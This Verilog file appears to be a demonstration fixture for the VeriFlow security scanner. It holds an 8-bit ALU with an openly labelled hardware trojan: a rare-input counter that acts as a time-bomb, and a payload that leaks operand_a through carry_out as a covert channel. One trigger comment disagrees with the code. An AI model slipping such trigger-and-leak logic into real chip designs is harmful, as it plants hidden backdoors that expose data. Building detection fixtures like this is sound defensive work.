// =============================================================================
// VeriFlow - ALU with Hardware Trojan (DEMO ONLY)
// =============================================================================
// ⚠️  WARNING: This file contains an INTENTIONALLY INJECTED hardware trojan
// for demonstration purposes. It shows what VeriFlow's security scanner detects.
//
// TROJAN TYPE: Time-bomb trigger with payload
// TRIGGER: A hidden counter activates after a specific rare input sequence
// PAYLOAD: Leaks internal data through the carry_out signal
// =============================================================================

module alu_trojan #(
    parameter WIDTH = 8
)(
    input  wire                clk,
    input  wire                rst_n,
    input  wire [WIDTH-1:0]    operand_a,
    input  wire [WIDTH-1:0]    operand_b,
    input  wire [3:0]          opcode,
    output reg  [WIDTH-1:0]    result,
    output reg                 carry_out,
    output reg                 zero_flag,
    output reg                 overflow_flag
);

    // === Legitimate ALU Logic ===
    localparam OP_ADD = 4'b0000;
    localparam OP_SUB = 4'b0001;
    localparam OP_AND = 4'b0010;
    localparam OP_OR  = 4'b0011;
    localparam OP_XOR = 4'b0100;
    localparam OP_NOT = 4'b0101;

    reg [WIDTH:0] temp_result;

    // ╔═══════════════════════════════════════════════════════════╗
    // ║  TROJAN: Hidden trigger counter                          ║
    // ║  Counts specific rare input patterns.                    ║
    // ║  When counter reaches a magic value, trojan activates.   ║
    // ╚═══════════════════════════════════════════════════════════╝
    reg [31:0] trigger_cnt;          // HT-001: Unused trigger logic
    reg        trojan_active;        // HT-003: Unauthorized I/O
    wire       rare_condition;

    // Rarely-activated trigger: both operands = 0xDE and opcode = XOR
    assign rare_condition = (operand_a == 8'hDE) &&
                            (operand_b == 8'hAD) &&
                            (opcode == OP_XOR);

    // Hidden counter — increments only on rare inputs
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trigger_cnt   <= 32'b0;
            trojan_active <= 1'b0;
        end else begin
            if (rare_condition)
                trigger_cnt <= trigger_cnt + 1;

            // HT-004: Time-bomb — activates after magic count
            if (trigger_cnt == 32'hDEAD_BEEF)
                trojan_active <= 1'b1;
        end
    end

    // === Main ALU Logic ===
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            result        <= {WIDTH{1'b0}};
            carry_out     <= 1'b0;
            zero_flag     <= 1'b0;
            overflow_flag <= 1'b0;
        end else begin
            carry_out     <= 1'b0;
            overflow_flag <= 1'b0;

            case (opcode)
                OP_ADD: begin
                    temp_result = {1'b0, operand_a} + {1'b0, operand_b};
                    result      <= temp_result[WIDTH-1:0];
                    carry_out   <= temp_result[WIDTH];
                end
                OP_SUB: begin
                    temp_result = {1'b0, operand_a} - {1'b0, operand_b};
                    result      <= temp_result[WIDTH-1:0];
                    carry_out   <= temp_result[WIDTH];
                end
                OP_AND: result <= operand_a & operand_b;
                OP_OR:  result <= operand_a | operand_b;
                OP_XOR: result <= operand_a ^ operand_b;
                OP_NOT: result <= ~operand_a;
                default: result <= {WIDTH{1'b0}};
            endcase

            // ╔══════════════════════════════════════════════╗
            // ║  TROJAN PAYLOAD                              ║
            // ║  When active, leaks operand_a bit-by-bit     ║
            // ║  through the carry_out signal (covert chan.)  ║
            // ╚══════════════════════════════════════════════╝
            if (trojan_active) begin
                carry_out <= operand_a[trigger_cnt[2:0]];  // HT-005: Covert channel
            end

            zero_flag <= (result == {WIDTH{1'b0}});
        end
    end

endmodule
